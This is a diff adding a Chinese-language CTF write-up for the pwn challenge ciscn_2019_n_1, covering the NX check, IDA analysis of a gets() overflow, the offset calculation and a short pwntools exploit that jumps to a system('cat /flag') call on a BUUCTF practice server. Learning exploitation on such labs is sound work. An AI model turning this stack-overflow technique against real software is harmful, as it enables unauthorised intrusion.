@@ -40,3 +40,25 @@ io.interactive()
 ```
 但我需要手动ls才能看到\
 ![image](https://user-images.githubusercontent.com/98165037/188305948-9a73121c-3ee2-4d72-94de-5000837f2849.png)
+# ciscn_2019_n_1
+checksec一下\
+![image](https://user-images.githubusercontent.com/98165037/188307032-fbd1e50f-e21c-4366-bab3-1aa9a5c6b4b8.png)\
+开了NX保护
+> NX即No-eXecute（不可执行）的意思，Windows平台上称为DEP，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。
+> 
+ida里打开\
+![image](https://user-images.githubusercontent.com/98165037/188307228-4a87c14e-672b-4856-807c-b299e07dd29c.png)\
+gets函数get！又直接有system("cat /flag")，但是它的条件为假，可以利用gets函数溢出，跳过条件判断，直接跳到system的执行\
+![image](https://user-images.githubusercontent.com/98165037/188307340-786b4ad7-a2a7-45eb-849d-d4ac3900b5f7.png)\
+该语句地址为0x4006BE\
+再看gets函数的参数v1，离rbp有0x30字节，并且rbp占8字节，一共（0x30+8）字节\
+![image](https://user-images.githubusercontent.com/98165037/188307433-9e0d7c2d-336a-4ce9-9303-41ede84ec32c.png)\
+exp如下
+```
+from pwn import *
+io = remote('node4.buuoj.cn',27107)
+payload = b'a'*(0x30+0x8)+p64(0x4006BE)
+io.send(payload)
+io.interactive()
+```
+
